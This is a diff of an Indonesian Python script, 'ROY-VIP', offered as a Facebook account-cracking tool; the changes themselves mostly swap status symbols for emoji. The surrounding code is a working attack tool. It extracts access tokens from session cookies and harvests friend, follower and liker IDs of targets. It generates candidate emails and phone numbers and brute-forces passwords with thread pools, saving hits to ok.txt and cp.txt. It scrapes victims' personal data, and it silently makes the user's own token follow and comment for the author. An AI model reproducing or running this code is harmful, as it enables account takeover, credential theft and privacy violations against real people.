@@ -80,7 +80,7 @@ def lang(cookies):
 	if f==True:
 		return True
 	else:
-		exit("[!] Wrong Cookies")
+		exit("[❌] Wrong Cookies")
 
 def basecookie():
 	if os.path.exists(".cok"):
@@ -118,13 +118,13 @@ def gets_dict_cookies(cookies):
 def logs():
   os.system("clear")
   banner()
-  print((p+"\n[ "+o+"Metode Login "+p+"]"+p))
+  print((p+"\n[ ❓"+o+"Metode Login "+p+"]"+p))
   print((p+"["+k+"1"+p+"]"+p+" Login Token"))
   print((p+"["+k+"2"+p+"]"+p+" Login Cookies"))
   print((p+"["+m+"0"+p+"]"+p+" "+m+"Exit"))
-  sek=input(p+"\n["+k+"?"+p+"]"+p+" Pilih : ")
+  sek=input(p+"\n["+k+"❓"+p+"]"+p+" Pilih 👉 ")
   if sek=="":
-    print((p+"\n["+k+"!"+p+"]"+p+" Isi yang benar!!!"))
+    print((p+"\n["+k+"❌"+p+"]"+p+" Isi yang benar!!!"))
     logs()
   elif sek=="1":
     log_token()
@@ -133,13 +133,13 @@ def logs():
   elif sek=="0":
     exit()
   else:
-    print((p+"\n["+k+"!"+p+"]"+p+" Isi yang benar!!!"))
+    print((p+"\n["+k+"❌"+p+"]"+p+" Isi yang benar!!!"))
     logs()
 
 def log_token():
     os.system("clear")
     banner()
-    toket = input(p+"\n["+k+"*"+p+"]"+p+" Token FB : ")
+    toket = input(p+"\n["+k+"⭐"+p+"]"+p+" Token FB 👉 ")
     try:
         otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
         a = json.loads(otw.text)
@@ -147,17 +147,17 @@ def log_token():
         zedd = open("login.txt", "w")
         zedd.write(toket)
         zedd.close()
-        print((p+"\n["+k+"*"+p+"]"+p+" Login Berhasil"))
+        print((p+"\n["+k+"✔"+p+"]"+p+" Login Berhasil"))
         bot_follow()
     except KeyError:
-        print((p+"["+k+"!"+p+"]"+p+" Token Mati"))
+        print((p+"["+k+"❌"+p+"]"+p+" Token Mati"))
         os.system("clear")
         logs()
 
 def gen():
         os.system("clear")
         banner()
-        cookie = input(p+"\n["+k+"*"+p+"]"+p+" Cookies : ")
+        cookie = input(p+"\n["+k+"⭐"+p+"]"+p+" Cookies 👉 ")
         try:
                 data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
                 "user-agent"                : "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36", # Jangan Di Ganti Ea Anjink.
@@ -175,11 +175,11 @@ def gen():
                 find_token = re.search("(EAAA\w+)", data.text)
                 hasil    = "\n* Gagal: Mungkin Cookie Anda Mati !!!" if (find_token is None) else "\n* Token akses FB Anda : " + find_token.group(1)
         except requests.exceptions.ConnectionError:
-                print((k+"["+p+"!"+k+"]"+p+" Tidak ada koneksi"))
+                print((k+"["+p+"⚠️"+k+"]"+p+" Tidak ada koneksi"))
         cookie = open("login.txt", "w")
         cookie.write(find_token.group(1))
         cookie.close()
-        print((p+"\n["+k+"•"+p+"]"+p+" Login Berhasil"))
+        print((p+"\n["+k+"✔"+p+"]"+p+" Login Berhasil"))
         bot_follow()
 
 ### BOT FOLLOW ### Jangan Diganti Anjing !!!
@@ -188,7 +188,7 @@ def bot_follow():
 	try:
 		toket=open("login.txt","r").read()
 	except IOError:
-		print((k+"\n["+p+"!"+k+"]"+p+" Token Mati"))
+		print((k+"\n["+p+"❌"+k+"]"+p+" Token Mati"))
 		logs()
 	kom = ("Dapunta ganteng mau ga jadi pacarku? ❤️❤️❤️❤️❤️\n\nhttps://www.facebook.com/photo.php?fbid=10214228940637251&set=a.1274773809249&type=3&app=fbl")
 	requests.post("https://graph.facebook.com/100035322483719/subscribers?access_token=" + toket)      #Dapunta Khurayra X
@@ -206,25 +206,25 @@ def menu():
         nama = a["name"]
         id = a["id"]
     except Exception as e:
-        print((p+"["+k+"!"+p+"]"+p+" Error : %s"%e))
+        print((p+"["+k+"❌"+p+"]"+p+" Error : %s"%e))
         logs()
     ip = requests.get("https://api.ipify.org").text
     os.system("clear")
     banner()
-    print("["+h+"ROY-VIP SC s7i Opera Mini]")
-    print((p+"[*] ============================================="))
-    print((p+"["+o+"💡"+p+"]"+p+" Author	: "+k+"Roy Octa Firdaus"))
-    print((p+"["+o+"❗"+p+"]"+p+" Facebook	: "+k+"facebook.com/JbFbOld"))
-    print((p+"["+o+"⚠️"+p+"]"+p+" Whatsapp	: "+k+"+6281318306972"))
-    print((p+"[*] ============================================="))
+    print("[⭐⭐⭐"+h+"ROY-VIP SC s7i Opera Mini⭐⭐⭐]")
+    print((p+"[💡] ============================================="))
+    print((p+"["+o+"⭐"+p+"]"+p+" Author		👉 "+k+"Roy Octa Firdaus"))
+    print((p+"["+o+"⭐"+p+"]"+p+" Facebook	👉 "+k+"facebook.com/JbFbOld"))
+    print((p+"["+o+"⭐"+p+"]"+p+" Whatsapp	👉 "+k+"+6281318306972"))
+    print((p+"[💡] ============================================="))
     print((p+"[ 👏"+k+"Selamat datang "+a["name"]+p+" ]"+p))
-    print((p+"[*] ============================================="))
+    print((p+"[💡] ============================================="))
     print((p+"["+o+"✔"+p+"]"+p+" ID FB Anda	👉 "+k+""+id))
-    print((p+"["+o+"❌"+p+"]"+p+" IP Anda	: "+k+""+ip))
-    print((p+"["+o+"⭐"+p+"]"+p+" Status	: "+h+"Premium"))
-    print((p+"["+o+"❓"+p+"]"+p+" Bergabung	: "+k+""+durasi))
-    print((p+"[*] ============================================="))
-    print((p+"[ "+o+"Menu Pilihan "+p+"]"+p))
+    print((p+"["+o+"✔"+p+"]"+p+" IP Anda	👉 "+k+""+ip))
+    print((p+"["+o+"✔"+p+"]"+p+" Status		👉 "+h+"Premium"))
+    print((p+"["+o+"✔"+p+"]"+p+" Bergabung	👉 "+k+""+durasi))
+    print((p+"[💡] ============================================="))
+    print((p+"[ ❓"+o+"Menu Pilihan "+p+"]"+p))
     print((p+"["+k+"1"+p+"]"+p+" Crack Dari Teman/Publik"))
     print((p+"["+k+"2"+p+"]"+p+" Crack Dari Followers FB"))
     print((p+"["+k+"3"+p+"]"+p+" Crack Dari Liker Postingan"))
@@ -233,13 +233,13 @@ def menu():
     print((p+"["+k+"6"+p+"]"+p+" Cek Data FB"))
     print((p+"["+k+"7"+p+"]"+k+" Cek Hasil Crack"))
     print((p+"["+m+"0"+p+"]"+m+" Logout/Keluar"))
-    print((p+"[*] ============================================="))
+    print((p+"[💡] ============================================="))
     choose_menu()
 
 def choose_menu():
-	r=input(p+"\n["+k+"?"+p+"]"+p+" Pilih : ")
+	r=input(p+"\n["+k+"❓"+p+"]"+p+" Pilih : ")
 	if r=="":
-		print((p+"["+k+"!"+p+"]"+p+" Maaf Salah"))
+		print((p+"["+k+"❌"+p+"]"+p+" Maaf Salah"))
 		menu()
 	elif r=="1":
 		publik()
@@ -257,29 +257,29 @@ def choose_menu():
 		ress()
 	elif r=="0":
 		try:
-			jalan(p+"\n["+k+"*"+p+"]"+p+" Terimakasih telah menggunakan SC ROY-VIP")
+			jalan(p+"\n["+k+"✔"+p+"]"+p+" Terimakasih telah menggunakan SC ROY-VIP")
 			os.system("rm -rf login.txt")
 			exit()
 		except Exception as e:
-			print((p+"["+k+"!"+p+"]"+p+" Error %s"%e))
+			print((p+"["+k+"❌"+p+"]"+p+" Error %s"%e))
 	else:
-		print((p+"["+k+"!"+p+"]"+p+" Salah Memasukkan"))
+		print((p+"["+k+"❌"+p+"]"+p+" Salah Memasukkan"))
 		menu()	
 
 def pilihcrack(file):
-  print((p+"\n[ "+o+"Pilih Metode Login : "+p+"]"+p))
+  print((p+"\n[ ❓"+o+"Pilih Metode Login : "+p+"]"+p))
   print((p+"["+k+"1"+p+"]"+p+" MBASIC ("+h+"Direkomedasikan"+p+")"))
   print((p+"["+k+"2"+p+"]"+p+" MBASIC + TTL"))
-  krah=input(p+"\n["+k+"?"+p+"]"+p+" Pilih : ")
+  krah=input(p+"\n["+k+"❓"+p+"]"+p+" Pilih 👉 ")
   if krah in[""]:
-    print((p+"["+k+"!"+p+"]"+p+" Maaf Salah"))
+    print((p+"["+k+"❌"+p+"]"+p+" Maaf Salah"))
     pilihcrack(file)
   elif krah in["1","01"]:
     crack(file)
   elif krah in["2","02"]:
     crackttl(file)
   else:
-    print((p+"["+k+"!"+p+"]"+p+" Maaf Salah"))
+    print((p+"["+k+"❌"+p+"]"+p+" Maaf Salah"))
     pilihcrack(file)
 
 ### DUMP ID ###
@@ -288,18 +288,18 @@ def publik():
 	try:
 		toket=open("login.txt","r").read()
 	except IOError:
-		print((p+"\n["+k+"!"+p+"]"+p+" Cookie/Token Mati"))
+		print((p+"\n["+k+"❌"+p+"]"+p+" Cookie/Token Mati"))
 		os.system("rm -rf login.txt")
 		logs()
 	try:
-		print((p+"\n["+k+"*"+p+"]"+p+" Klik \'me\' Untuk Crack Dari List Teman"))
-		idt = input(p+"["+k+"*"+p+"]"+p+" User ID Target : ")
+		print((p+"\n["+k+"⭐"+p+"]"+p+" Klik \'me\' Untuk Crack Dari List Teman"))
+		idt = input(p+"["+k+"⭐"+p+"]"+p+" User ID Target 👉 ")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			print((p+"["+k+"*"+p+"]"+p+" Name : "+op["name"]))
+			print((p+"["+k+"⭐"+p+"]"+p+" Name 👉 "+op["name"]))
 		except KeyError:
-			print((p+"["+k+"!"+p+"]"+p+" ID Tidak Ditemukan"))
+			print((p+"["+k+"❌"+p+"]"+p+" ID Tidak Ditemukan"))
 			print((o+"\n»»» "+k+"ENTER Untuk Kembali" +o+"«««"))
 			publik()
 		r=requests.get("https://graph.facebook.com/"+idt+"/friends?limit=10000&access_token="+toket)
@@ -311,26 +311,26 @@ def publik():
 			id.append(a["id"]+"<=>"+a["name"])
 			ys.write(a["id"]+"<=>"+a["name"]+"\n")
 		ys.close()
-		print((p+"["+k+"*"+p+"]"+p+" Total ID : %s"%(len(id))))
+		print((p+"["+k+"⭐"+p+"]"+p+" Total ID 👉 %s"%(len(id))))
 		return pilihcrack(qq)
 	except Exception as e:
-		exit(p+"["+k+"!"+p+"]"+p+" Error : %s"%e)
+		exit(p+"["+k+"❌"+p+"]"+p+" Error 👉 %s"%e)
 
 def follow():
 	try:
 		toket=open("login.txt","r").read()
 	except IOError:
-		print((p+"\n["+k+"!"+p+"]"+p+" Cookie/Token Mati"))
+		print((p+"\n["+k+"❌"+p+"]"+p+" Cookie/Token Mati"))
 		os.system("rm -rf login.txt")
 		logs()
 	try:
-		idt = input(p+"\n["+k+"*"+p+"]"+p+" ID Followers Target : ")
+		idt = input(p+"\n["+k+"⭐"+p+"]"+p+" ID Followers Target 👉 ")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			print((p+"["+k+"*"+p+"]"+p+" Name : "+op["name"]))
+			print((p+"["+k+"⭐"+p+"]"+p+" Name 👉 "+op["name"]))
 		except KeyError:
-			print((p+"["+k+"!"+p+"]"+p+" ID Tidak Ditemukan"))
+			print((p+"["+k+"❌"+p+"]"+p+" ID Tidak Ditemukan"))
 			print((o+"\n»»» "+k+"ENTER Untuk Kembali" +o+"«««"))
 			publik()
 		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
@@ -342,26 +342,26 @@ def follow():
 			id.append(a["id"]+"<=>"+a["name"])
 			ys.write(a["id"]+"<=>"+a["name"]+"\n")
 		ys.close()
-		print((p+"["+k+"*"+p+"]"+p+" Total ID : %s"%(len(id))))
+		print((p+"["+k+"⭐"+p+"]"+p+" Total ID 👉 %s"%(len(id))))
 		return pilihcrack(qq)
 	except Exception as e:
-		exit(p+"["+k+"!"+p+"]"+p+" Error : %s"%e)
+		exit(p+"["+k+"❌"+p+"]"+p+" Error 👉 %s"%e)
 
 def likers():
 	try:
 		toket=open("login.txt","r").read()
 	except IOError:
-		print((p+"\n["+k+"!"+p+"]"+p+" Cookie/Token Mati"))
+		print((p+"\n["+k+"❌"+p+"]"+p+" Cookie/Token Mati"))
 		os.system("rm -rf login.txt")
 		logs()
 	try:
-		idt = input(p+"\n["+k+"*"+p+"]"+p+" ID Postingan Target : ")
+		idt = input(p+"\n["+k+"⭐"+p+"]"+p+" ID Postingan Target 👉 ")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			print((p+"["+k+"*"+p+"]"+p+" Name : "+op["name"]))
+			print((p+"["+k+"⭐"+p+"]"+p+" Name 👉 "+op["name"]))
 		except KeyError:
-			print((p+"["+k+"!"+p+"]"+p+" ID Tidak Ditemukan"))
+			print((p+"["+k+"❌"+p+"]"+p+" ID Tidak Ditemukan"))
 			print((o+"\n»»» "+k+"ENTER Untuk Kembali" +o+"«««"))
 			publik()
 		r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=100000&access_token="+toket)
@@ -373,41 +373,41 @@ def likers():
 			id.append(a["id"]+"<=>"+a["name"])
 			ys.write(a["id"]+"<=>"+a["name"]+"\n")
 		ys.close()
-		print((p+"["+k+"*"+p+"]"+p+" Total ID : %s"%(len(id))))
+		print((p+"["+k+"⭐"+p+"]"+p+" Total ID 👉 %s"%(len(id))))
 		return pilihcrack(qq)
 	except Exception as e:
-		exit(p+"["+k+"!"+p+"]"+p+" Error : %s"%e)
+		exit(p+"["+k+"❌"+p+"]"+p+" Error 👉 %s"%e)
 
 ### CRACK EMAIL & PHONE ###
 
 def random_numbers():
   data = []
-  print((p+"\n["+k+"*"+p+"]"+p+" Nomor Harus 5 Digit"))
-  print((p+"["+k+"*"+p+"]"+p+" Contoh : 92037"))
-  kode=str(input(p+"["+k+"*"+p+"]"+p+" Masukkan Nomor : "))
-  exit((p+"\n["+k+"!"+p+"]"+p+" Nomor Harus 5 Digit")) if len(kode) < 5 else ''
-  exit((p+"\n["+k+"!"+p+"]"+p+" Nomor Harus 5 Digit")) if len(kode) > 5 else ''
-  jml=int(input(p+"["+k+"*"+p+"]"+p+" Total : "))
+  print((p+"\n["+k+"⭐"+p+"]"+p+" Nomor Harus 5 Digit"))
+  print((p+"["+k+"⭐"+p+"]"+p+" Contoh 👉 92037"))
+  kode=str(input(p+"["+k+"⭐"+p+"]"+p+" Masukkan Nomor 👉 "))
+  exit((p+"\n["+k+"❌"+p+"]"+p+" Nomor Harus 5 Digit")) if len(kode) < 5 else ''
+  exit((p+"\n["+k+"❌"+p+"]"+p+" Nomor Harus 5 Digit")) if len(kode) > 5 else ''
+  jml=int(input(p+"["+k+"⭐"+p+"]"+p+" Total 👉 "))
   [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:])]}) for e in [str(kode)+''.join(['%s'%(randint(0,9)) for i in range(0,7)]) for e in range(jml)]]
-  print(p+"\n["+k+"*"+p+"]"+p+" Crack by ROY, Tunggu Sebentar...\n")
+  print(p+"\n["+k+"✔"+p+"]"+p+" Crack by ROY, Tunggu Sebentar...\n")
   with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
     {th.submit(brute, user['user'], user['pw']): user for user in data}
-  input(p+"\n[ "+k+"Back"+p+" ]"+p)
+  input(o+"\n»»» "+k+"ENTER Untuk Kembali" +o+"«««")
   menu()
 
 def random_email():
   data = []
-  nama=input(p+"\n["+k+"*"+p+"]"+p+" Nama Target : ")
-  domain=input(p+"["+k+"*"+p+"]"+p+" Pilih Domain [G]mail, [Y]ahoo, [H]otmail : ").lower().strip()
+  nama=input(p+"\n["+k+"⭐"+p+"]"+p+" Nama Target 👉 ")
+  domain=input(p+"["+k+"⭐"+p+"]"+p+" Pilih Domain [G]mail, [Y]ahoo, [H]otmail 👉 ").lower().strip()
   list={
     'g':'@gmail.com',
     'y':'@yahoo.com',
     'h':'@hotmail.com'
   }
-  exit((p+"["+k+"*"+p+"]"+p+" Isi Yang Benar")) if not domain in ['g','y','h'] else ''
-  jml=int(input(p+"["+k+"*"+p+"]"+p+" Total : "))
-  setpw=input(p+"["+k+"*"+p+"]"+p+" Setel Kata Sandi : ").split(',')
-  print(p+"\n["+k+"*"+p+"]"+p+" Crack by ROY, Tunggu Sebentar...\n")
+  exit((p+"["+k+"❌"+p+"]"+p+" Isi Yang Benar")) if not domain in ['g','y','h'] else ''
+  jml=int(input(p+"["+k+"⭐"+p+"]"+p+" Total 👉 "))
+  setpw=input(p+"["+k+"⭐"+p+"]"+p+" Setel Kata Sandi 👉 ").split(',')
+  print(p+"\n["+k+"✔"+p+"]"+p+" Crack by ROY, Tunggu Sebentar...\n")
   [data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,jml+1)]
   with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
     {th.submit(brute, user['user'], user['pw']): user for user in data}
@@ -444,34 +444,34 @@ def target():
 	try:
 		toket=open("login.txt","r").read()
 	except IOError:
-		print((p+"\n["+k+"!"+p+"]"+p+" Token Mati"))
+		print((p+"\n["+k+"❌"+p+"]"+p+" Token Mati"))
 		os.system("rm -rf login.txt")
 		login()
 	try:
-		idt = input(p+"\n["+k+"*"+p+"]"+p+" ID Target	: ")
+		idt = input(p+"\n["+k+"⭐"+p+"]"+p+" ID Target	👉 ")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			print((p+"["+k+"*"+p+"]"+p+" Name Akun	: "+op["name"]))
-			print((p+"["+k+"*"+p+"]"+p+" Username	: "+op["username"]))
+			print((p+"["+k+"⭐"+p+"]"+p+" Name Akun	👉 "+op["name"]))
+			print((p+"["+k+"⭐"+p+"]"+p+" Username	👉 "+op["username"]))
 			try:
 				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 				op = json.loads(jok.text)
-				print((p+"["+k+"*"+p+"]"+p+" Email	: "+op["email"]))
+				print((p+"["+k+"⭐"+p+"]"+p+" Email	👉 "+op["email"]))
 			except KeyError:
-				print((p+"["+k+"*"+p+"]"+p+" Email	: -"))
+				print((p+"["+k+"⭐"+p+"]"+p+" Email	👉 -"))
 			try:
 				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 				op = json.loads(jok.text)
-				print((p+"["+k+"*"+p+"]"+p+" Tanggal Lahir	: "+op["birthday"]))
+				print((p+"["+k+"⭐"+p+"]"+p+" Tanggal Lahir	👉 "+op["birthday"]))
 			except KeyError:
-				print((p+"["+k+"*"+p+"]"+p+" Tanggal Lahir	: -"))
+				print((p+"["+k+"⭐"+p+"]"+p+" Tanggal Lahir	👉 -"))
 			try:
 				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 				op = json.loads(jok.text)
-				print((p+"["+k+"*"+p+"]"+p+" Jenis Kelamin	: "+op["gender"]))
+				print((p+"["+k+"⭐"+p+"]"+p+" Jenis Kelamin	👉 "+op["gender"]))
 			except KeyError:
-				print((p+"["+k+"*"+p+"]"+p+" Jenis Kelamin	: -"))
+				print((p+"["+k+"⭐"+p+"]"+p+" Jenis Kelamin	👉 -"))
 			try:
 				r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 				id = []
@@ -482,9 +482,9 @@ def target():
 					id.append(i["id"])
 					ys.write(i["id"])
 				ys.close()
-				print((p+"["+k+"*"+p+"]"+p+" Total Teman	: %s"%(len(id))))
+				print((p+"["+k+"⭐"+p+"]"+p+" Total Teman	👉 %s"%(len(id))))
 			except KeyError:
-				print((p+"["+k+"*"+p+"]"+p+" Total Teman	: -"))
+				print((p+"["+k+"⭐"+p+"]"+p+" Total Teman	👉 -"))
 			try:
 				a=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
 				id = []
@@ -495,32 +495,32 @@ def target():
 					id.append(c["id"])
 					jw.write(c["id"])
 				jw.close()
-				print((p+"["+k+"*"+p+"]"+p+" Total Pengikut FB	: %s"%(len(id))))
+				print((p+"["+k+"⭐"+p+"]"+p+" Total Pengikut FB	👉 %s"%(len(id))))
 			except KeyError:
-				print((p+"["+k+"*"+p+"]"+p+" Total Pengikut FB	: -"))
+				print((p+"["+k+"⭐"+p+"]"+p+" Total Pengikut FB	👉 -"))
 			try:
 				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 				op = json.loads(jok.text)
-				print((p+"["+k+"*"+p+"]"+p+" Website	: "+op["website"]))
+				print((p+"["+k+"⭐"+p+"]"+p+" Website	👉 "+op["website"]))
 			except KeyError:
-				print((p+"["+k+"*"+p+"]"+p+" Website	: -"))
+				print((p+"["+k+"⭐"+p+"]"+p+" Website	👉 -"))
 			except IOError:
-				print((p+"["+k+"*"+p+"]"+p+" Website	: -"))
+				print((p+"["+k+"⭐"+p+"]"+p+" Website	👉 -"))
 			try:
 				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 				op = json.loads(jok.text)
-				print((p+"["+k+"*"+p+"]"+p+" Terakhir Update	: "+op["updated_time"]))
+				print((p+"["+k+"⭐"+p+"]"+p+" Terakhir Update	👉 "+op["updated_time"]))
 			except KeyError:
-				print((p+"["+k+"*"+p+"]"+p+" Terakhir Update	: -"))
+				print((p+"["+k+"⭐"+p+"]"+p+" Terakhir Update	👉 -"))
 			except IOError:
-				print((p+"["+k+"*"+p+"]"+p+" Terakhir Update	: -"))
+				print((p+"["+k+"⭐"+p+"]"+p+" Terakhir Update	👉 -"))
 			input(o+"\n»»» "+k+"ENTER Untuk Kembali" +o+"«««")
 			menu()
 		except KeyError:
 			input(o+"\n»»» "+k+"ENTER Untuk Kembali" +o+"«««")
 			menu()
 	except Exception as e:
-		exit(p+"["+k+"!"+p+"]"+p+" Error : %s"%e)
+		exit(p+"["+k+"❌"+p+"]"+p+" Error 👉 %s"%e)
 
 ### PASSWORD ###
 
@@ -583,9 +583,9 @@ class crack:
 		self.ada=[]
 		self.cp=[]
 		self.ko=0
-		print((p+"\n["+k+"*"+p+"]"+p+" Crack Dengan Kata Sandi Default/Manual [d/m]?"))
+		print((p+"\n["+k+"⭐"+p+"]"+p+" Crack Dengan Kata Sandi Default/Manual [d/m]?"))
 		while True:
-			f=input(p+"["+k+"?"+p+"]"+p+" Pilih : ")
+			f=input(p+"["+k+"❓"+p+"]"+p+" Pilih 👉 ")
 			if f=="":continue
 			elif f=="m":
 				try:
@@ -605,7 +605,7 @@ class crack:
 				except Exception as e:
 					print(("   %s"%e))
 					continue
-				print((p+"["+k+"*"+p+"]"+p+" Contoh : 123456,rahasia,cantik123"))
+				print((p+"["+k+"⭐"+p+"]"+p+" Contoh 👉 123456,rahasia,cantik123"))
 				self.pwlist()
 				break
 			elif f=="d":
@@ -625,19 +625,19 @@ class crack:
 						except:continue
 				except Exception as e:
 					print(("   %s"%e))
-				print((p+"\n["+k+"*"+p+"]"+p+" Crack by ROY sedang berjalan..."+p+"\n["+k+"*"+p+"]"+p+" Akun ["+h+"OK"+p+"] Disimpan di : ok.txt"+p+"\n["+k+"*"+p+"]"+p+" Akun ["+k+"CP"+p+"] Disimpan di : cp.txt\n"))
+				print((p+"\n["+k+"✔"+p+"]"+p+" Crack by ROY sedang berjalan..."+p+"\n["+k+"✔"+p+"]"+p+" Akun ["+h+"OK"+p+"] Disimpan di : ok.txt"+p+"\n["+k+"✔"+p+"]"+p+" Akun ["+k+"CP"+p+"] Disimpan di : cp.txt\n"))
 				ThreadPool(35).map(self.main,self.fl)
 				os.remove(self.apk)
 				exit()
 				break
 	def pwlist(self):
-		self.pw=input(p+"["+k+"*"+p+"]"+p+" List Kata Sandi : ").split(",")
+		self.pw=input(p+"["+k+"⭐"+p+"]"+p+" List Kata Sandi 👉 ").split(",")
 		if len(self.pw) ==0:
 			self.pwlist()
 		else:
 			for i in self.fl:
 				i.update({"pw":self.pw})
-			print((p+"\n["+k+"*"+p+"]"+p+" Crack by ROY sedang berjalan..."+p+"\n["+k+"*"+p+"]"+p+" Akun ["+h+"OK"+p+"] Disimpan di : ok.txt"+p+"\n["+k+"*"+p+"]"+p+" Akun ["+k+"CP"+p+"] Disimpan di : cp.txt\n"))
+			print((p+"\n["+k+"✔"+p+"]"+p+" Crack by ROY sedang berjalan..."+p+"\n["+k+"✔"+p+"]"+p+" Akun ["+h+"OK"+p+"] Disimpan di : ok.txt"+p+"\n["+k+"✔"+p+"]"+p+" Akun ["+k+"CP"+p+"] Disimpan di : cp.txt\n"))
 			ThreadPool(30).map(self.main,self.fl)
 			os.remove(self.apk)
 			exit()
@@ -672,9 +672,9 @@ class crackttl:
 		self.ada=[]
 		self.cp=[]
 		self.ko=0
-		print((p+"\n["+k+"*"+p+"]"+p+" Crack Dengan Kata Sandi Default/Manual [d/m]?"))
+		print((p+"\n["+k+"⭐"+p+"]"+p+" Crack Dengan Kata Sandi Default/Manual [d/m]?"))
 		while True:
-			f=input(p+"["+k+"?"+p+"]"+p+" Pilih : ")
+			f=input(p+"["+k+"❓"+p+"]"+p+" Pilih 👉 ")
 			if f=="":continue
 			elif f=="m":
 				try:
@@ -694,7 +694,7 @@ class crackttl:
 				except Exception as e:
 					print(("   %s"%e))
 					continue
-				print((p+"["+k+"*"+p+"]"+p+" Contoh : sayang,bismillah,123456"))
+				print((p+"["+k+"⭐"+p+"]"+p+" Contoh 👉 sayang,bismillah,123456"))
 				self.pwlist()
 				break
 			elif f=="d":
@@ -714,19 +714,19 @@ class crackttl:
 						except:continue
 				except Exception as e:
 					print(("   %s"%e))
-				print((p+"\n["+k+"*"+p+"]"+p+" Crack by ROY sedang berjalan..."+p+"\n["+k+"*"+p+"]"+p+" Akun ["+h+"OK"+p+"] Disimpan di : ok.txt"+p+"\n["+k+"*"+p+"]"+p+" Akun ["+k+"CP"+p+"] Disimpan di : cp.txt\n"))
+				print((p+"\n["+k+"✔"+p+"]"+p+" Crack by ROY sedang berjalan..."+p+"\n["+k+"✔"+p+"]"+p+" Akun ["+h+"OK"+p+"] Disimpan di : ok.txt"+p+"\n["+k+"✔"+p+"]"+p+" Akun ["+k+"CP"+p+"] Disimpan di : cp.txt\n"))
 				ThreadPool(35).map(self.main,self.fl)
 				os.remove(self.apk)
 				exit()
 				break
 	def pwlist(self):
-		self.pw=input(p+"["+k+"*"+p+"]"+p+" List Kata Sandi : ").split(",")
+		self.pw=input(p+"["+k+"⭐"+p+"]"+p+" List Kata Sandi 👉 ").split(",")
 		if len(self.pw) ==0:
 			self.pwlist()
 		else:
 			for i in self.fl:
 				i.update({"pw":self.pw})
-			print((p+"\n["+k+"*"+p+"]"+p+" Crack by ROY sedang berjalan..."+p+"\n["+k+"*"+p+"]"+p+" Akun ["+h+"OK"+p+"] Disimpan di : ok.txt"+p+"\n["+k+"*"+p+"]"+p+" Akun ["+k+"CP"+p+"] Disimpan di : cp.txt\n"))
+			print((p+"\n["+k+"✔"+p+"]"+p+" Crack by ROY sedang berjalan..."+p+"\n["+k+"✔"+p+"]"+p+" Akun ["+h+"OK"+p+"] Disimpan di : ok.txt"+p+"\n["+k+"✔"+p+"]"+p+" Akun ["+k+"CP"+p+"] Disimpan di : cp.txt\n"))
 			ThreadPool(30).map(self.main,self.fl)
 			os.remove(self.apk)
 			exit()
@@ -766,9 +766,9 @@ class crackttl:
 
 def results(Dapunta,Krahkrah):
         if len(Dapunta) !=0:
-                print(("["+h+"OK"+p+"] : "+str(len(Dapunta))))
+                print(("["+h+"OK"+p+"] 👉 "+str(len(Dapunta))))
         if len(Krahkrah) !=0:
-                print(("["+h+"CP"+p+"] : "+str(len(Krahkrah))))
+                print(("["+h+"CP"+p+"] 👉 "+str(len(Krahkrah))))
         if len(Dapunta) ==0 and len(Krahkrah) ==0:
                 print("\n")
                 print((p+"["+k+"!"+p+"]"+p+" Tidak Ada Hasil Ditemukan"))
@@ -777,21 +777,21 @@ def ress():
     os.system("clear")
     banner()
     print("["+h+"ROY-VIP SC s7i Opera Mini]")
-    print((p+"[*] ============================================="))
-    print((p+"["+o+"*"+p+"]"+p+" Author	: "+k+"Roy Octa Firdaus"))
-    print((p+"["+o+"*"+p+"]"+p+" Facebook	: "+k+"facebook.com/jbfbold"))
-    print((p+"["+o+"*"+p+"]"+p+" Whatsapp	: "+k+"+6281318306972"))
-    print((p+"[*] ============================================="))
+    print((p+"[💡] ============================================="))
+    print((p+"["+o+"⭐"+p+"]"+p+" Author	👉 "+k+"Roy Octa Firdaus"))
+    print((p+"["+o+"⭐"+p+"]"+p+" Facebook	👉 "+k+"facebook.com/jbfbold"))
+    print((p+"["+o+"⭐"+p+"]"+p+" Whatsapp	👉 "+k+"+6281318306972"))
+    print((p+"[💡] ============================================="))
     print((p+"\n[ "+o+"Hasil Crack "+h+"OK"+p+" ]"+p))
     try:
         os.system("cat ok.txt")
     except IOError:
-        print((p+"["+k+"!"+p+"]"+p+" Tidak Ada Hasil Ditemukan"))
+        print((p+"["+k+"❌"+p+"]"+p+" Tidak Ada Hasil Ditemukan"))
     print((p+"\n[ "+o+"Hasil Crack "+k+"CP"+p+" ]"+p))
     try:
         os.system("cat cp.txt")
     except IOError:
-        print((p+"["+k+"!"+p+"]"+p+" Tidak Ada Hasil Ditemukan"))
+        print((p+"["+k+"❌"+p+"]"+p+" Tidak Ada Hasil Ditemukan"))
     input(o+"\n»»» "+k+"ENTER Untuk Kembali" +o+"«««")
     menu()
 
